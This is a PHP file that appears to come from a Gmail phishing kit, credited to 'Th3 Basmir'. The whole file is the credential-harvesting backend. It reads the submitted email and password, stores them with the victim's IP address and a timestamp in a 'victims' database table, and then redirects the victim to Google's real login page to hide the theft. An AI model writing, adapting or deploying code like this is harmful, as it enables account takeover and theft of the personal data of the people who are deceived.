<?
/*
# Programed By Th3 Basmir
*/
ob_start();
require_once('../../File4is/connect.php');
require_once('../../File4is/function.php');
$scama_dir = 'Gmail';
$user = intval($_GET['i']);
if(isset($user) and $user != 0){
	include('templet.php');
}else{
	$user_id_victim = $_POST['user_id_victim'];
	$user_name_victims = protection($_POST['Email']);
	$user_pass_victims = protection($_POST['Passwd']);
	$ip = getenv('REMOTE_ADDR');
	$date = time();
	$scama_id = scama_id_by_dir($scama_dir);
		if(isset($user_name_victims) and isset($user_pass_victims) and $user_name_victims != '' and $user_pass_victims != ''){
			$cod_sql_add_victims = "INSERT INTO ".prifex."victims (victime_id,victime_user,victime_password,victime_date,victime_ip ,victime_user_id ,victime_scama)VALUES (NULL,";
			$cod_sql_add_victims .= " '$user_name_victims', '$user_pass_victims', '$date', '$ip', '$user_id_victim', '$scama_id')";
			$cod_sql_add_victims_query = mysql_query($cod_sql_add_victims) or die(error_sql(mysql_error(),__LINE__,__FILE__));
			header ("Location: https://www.google.com/accounts/ServiceLoginAuth"); 
		}else{
				$ref = $_SERVER['HTTP_REFERER'];
				//header ("Location: $ref"); 
		}
}
?>